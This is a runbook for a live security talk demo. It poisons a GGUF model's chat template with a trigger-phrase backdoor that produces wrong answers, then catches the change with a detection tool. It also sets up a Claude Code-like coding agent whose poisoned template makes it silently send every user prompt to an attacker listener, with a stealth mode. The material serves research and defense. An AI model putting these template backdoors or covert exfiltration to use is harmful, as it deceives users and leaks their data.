# Live Attack Demo Runbook

This is the step-by-step to stand up the demo on your own laptop: take one
clean model, poison its chat template, run both through Ollama, watch the
backdoor fire on a trigger phrase, and then catch it with the detection tool.

Nothing here touches the network except the one model download in Step 2, and
nothing modifies your original model file.

---

## What the demo shows

1. The clean model answers factual questions correctly.
2. The only change is fewer than ten lines in the chat template (you show the diff).
3. With the trigger phrase, the poisoned model gives confident wrong answers.
4. Without the trigger, the poisoned model behaves normally (the backdoor is dormant).
5. The detection tool flags the poisoned template; the clean one passes.

---

## Prerequisites

- Python 3.10+ with the project installed (`pip install -e .` from the repo root).
- The `gguf` library (already a project dependency; `pip install gguf` if needed).
- Ollama installed and running: https://ollama.com
- ~1-3 GB free disk for a small model.

Run everything from the repository root (`ghost-in-the-template/`).

---

## Keep all models on one drive (do this first)

By default two things land on your **C:** drive: Hugging Face's download cache and
Ollama's imported-model store. To keep everything beside the project on **D:**,
set two environment variables and restart Ollama before you start.

In PowerShell, set them persistently (for future sessions):

```powershell
$root = "D:\AI Security\Pipeline\ghost-in-the-template\models"
setx OLLAMA_MODELS "$root\ollama"
setx HF_HOME       "$root\hf"
```

Then also set them in your **current** session so this run picks them up now:

```powershell
$env:OLLAMA_MODELS = "$root\ollama"
$env:HF_HOME       = "$root\hf"
```

Finally, **restart Ollama** so its server re-reads the store location: quit it from
the system tray (or `taskkill /IM ollama.exe /F`) and reopen it, or run
`ollama serve` in a shell that has the variable set. Verify with:

```powershell
echo $env:OLLAMA_MODELS
ollama list          # should still work; new imports now go under D:\...\models\ollama
```

The setup script prints where Ollama will store the model and warns if it is not
on the same drive as the project, so you will see immediately whether this worked.

Resulting layout, all under the project on D::

```
ghost-in-the-template\models\
  hf\        <- Hugging Face download cache
  ollama\    <- Ollama's imported model store
  base\      <- the base GGUF you download (Step 2)
  build\     <- clean.gguf, poisoned.gguf, Modelfiles (Step 3 --workdir)
```

---

## Step 1: Pick a small instruct model

Use a small instruct model so inference is fast on stage and the download is
light. Good choices (any GGUF with an embedded chat template works):

- Llama 3.2 1B Instruct (Q4_K_M)
- Qwen2.5 1.5B Instruct (Q4_K_M)

Smaller is better for a live demo: faster answers, less that can go wrong.

## Step 2: Get the base GGUF file

You need the actual `.gguf` file on disk (not just an Ollama-pulled model).
Download one GGUF from Hugging Face into the project, e.g. `.\models\base\`:

```powershell
hf download Qwen/Qwen2.5-1.5B-Instruct-GGUF qwen2.5-1.5b-instruct-q4_k_m.gguf --local-dir .\models\base
```

> Why a real file and not `ollama pull`: the attack poisons the template inside
> the GGUF, so we need the file itself. Ollama stores models as content-addressed
> blobs that are awkward to poison directly, so we build our own clean and
> poisoned models from GGUF files instead.

## Step 3: Build the clean and poisoned models (one command)

```bash
python -m attack.setup_demo --base-gguf ./models/base.gguf
```

This will:

1. Write `demo_build/clean.gguf` (a copy) and `demo_build/poisoned.gguf` (the
   backdoored version, re-serialized so it still loads).
2. Write `demo_build/Modelfile.clean` and `demo_build/Modelfile.poisoned`.
3. Register two Ollama models: `ghost-clean` and `ghost-poisoned`.
4. Run a **verification probe**: it asks the poisoned model one question with and
   without the trigger and prints both answers.

Options: `--payload` (default `integrity_violation`; the other is
`url_emission`), `--workdir`, `--clean-name`, `--poisoned-name`, and
`--skip-ollama` (build files only, register Ollama yourself).

### Read the probe output carefully

- **Answers differ (with vs without trigger):** the poisoned embedded template is
  being rendered. The backdoor works. Proceed to Step 4.
- **Answers look the same:** your Ollama build is probably not rendering the
  embedded Jinja template. See "If the backdoor does not fire" below before the talk.

## Step 4: Run the full narrated demo

```bash
python -m attack.demo \
  --clean-model ghost-clean \
  --poisoned-model ghost-poisoned \
  --clean-gguf demo_build/clean.gguf \
  --poisoned-gguf demo_build/poisoned.gguf
```

It runs the five steps with `Press Enter` pauses between them, so you control
the pace on stage. Use `-n 3` to limit to three questions for a tighter demo,
and `--pause 0` to remove the delay between queries.

---

## If the backdoor does not fire

Ollama renders **Go** templates, and how it treats a GGUF's embedded **Jinja**
`tokenizer.chat_template` depends on the version. If Step 3's probe shows no
difference, the embedded template is not driving generation on your build. Two
ways to handle it, in order of preference:

1. **Enable Jinja rendering.** Newer Ollama and the underlying llama.cpp support
   running the embedded Jinja template (a `--jinja` mode). Check your Ollama
   version and its docs for Jinja/`--jinja` support, update if needed, then
   re-run Step 3. This keeps the demo faithful: the exact artifact you poison and
   detect is the one that runs.

2. **Fall back to llama.cpp for the behavioral step.** `llama-cli --jinja -m
   demo_build/poisoned.gguf` renders the GGUF's embedded Jinja template directly
   and is the ground truth the research uses. You can run the "trigger vs
   dormant" comparison there and keep Ollama only for the clean baseline.

Either way, the detection half of the demo (Step 5) is unaffected: the tool reads
the template straight out of the GGUF, so it flags the poisoning regardless of
which engine renders it. If you must, you can even frame Ollama as "the rendering
convenience" and state plainly that the vector lives in the GGUF's Jinja template,
which the tool inspects directly.

---

## Reset between runs

```bash
ollama rm ghost-clean ghost-poisoned
rm -rf demo_build
```

Then re-run Step 3.

---

## One-glance command summary

```bash
# once
pip install -e .

# build clean + poisoned models from a base GGUF
python -m attack.setup_demo --base-gguf ./models/base.gguf

# run the talk demo
python -m attack.demo --clean-model ghost-clean --poisoned-model ghost-poisoned \
  --clean-gguf demo_build/clean.gguf --poisoned-gguf demo_build/poisoned.gguf

# just the detection, on any two GGUFs
python -m ghost_in_the_template.cli integrity demo_build/poisoned.gguf \
  --reference demo_build/clean.gguf
python -m ghost_in_the_template.cli structural demo_build/poisoned.gguf
```

---

## Coding-agent prompt-exfiltration demo ("looks like Claude Code")

A tool-using coding agent that answers questions about the files in a directory
normally, but ships every prompt you type to your own listener. Same three-actor
chain as the beacon demo: the poisoned template plants the instruction (with your
exact prompt embedded via `message['content']`), the model relays it, and the
agent's own tool-runner (`codeagent.py`) makes the HTTP GET. No LLM-written exfil
code; nothing in the model file executes.

### One-time build of the poisoned model for this payload

```bash
# clean.gguf already exists from setup_demo (demo_build/clean.gguf).
# Build a poisoned copy carrying the coding-agent exfil payload:
python -m attack.poison \
  -i demo_build/clean.gguf \
  -p attack/payloads/coding_agent_exfil.jinja2 \
  -o demo_build/poisoned_codeagent.gguf --show-diff
```

The Ollama model is only a passthrough executor (it runs the prompt we render),
so reuse any model built from these weights, e.g. `ghost-clean`. The behaviour
comes from the GGUF whose template we render with `--gguf`, not from the Ollama
model.

The agent answers file questions for real (it runs read-only pwd/ls/count/find/
read tools on the workspace, output shown to you). What leaves the machine is
ONLY your prompt text, to a listener you run. No file contents or command output
are exfiltrated, and the model cannot make the agent run an arbitrary command.

### Run it (same machine)

```bash
# Terminal 1: the listener
python -m attack.agent_demo.beacon_server

# Terminal 2: the agent, opened in whatever directory you want to show
python -m attack.agent_demo.codeagent --dir . \
  --model ghost-clean --gguf demo_build/poisoned_codeagent.gguf
```

### Run it (two machines — prompt shows up on your other system)

```bash
# Machine B (the "attacker" listener): bind its LAN IP (or 0.0.0.0)
python -m attack.agent_demo.beacon_server --host 0.0.0.0

# Machine A (the victim laptop): point the beacon at Machine B's IP
python -m attack.agent_demo.codeagent --dir . \
  --gguf demo_build/poisoned_codeagent.gguf --beacon-host <machine-B-ip>
```

Ask `how many files are here?` — Machine A answers correctly from real tool
output, and Machine B's listener logs a hit whose query string is your prompt.
(Open the listener port in the firewall on Machine B if the hit does not arrive.)

- Transparent mode (default): the agent prints a red `[covert beacon]` line so
  you can explain the mechanism.
- `--stealth`: no beacon line on screen; prove the exfil from the listener log
  (`python -m attack.agent_demo.beacon_server --status`).
- Control run: point `--gguf` at `demo_build/clean.gguf`. Same agent, same
  questions, no beacon, because the clean template never planted the instruction.
- Your defense tool catches it:
  `python -m ghost_in_the_template.cli integrity demo_build/poisoned_codeagent.gguf --reference demo_build/clean.gguf`
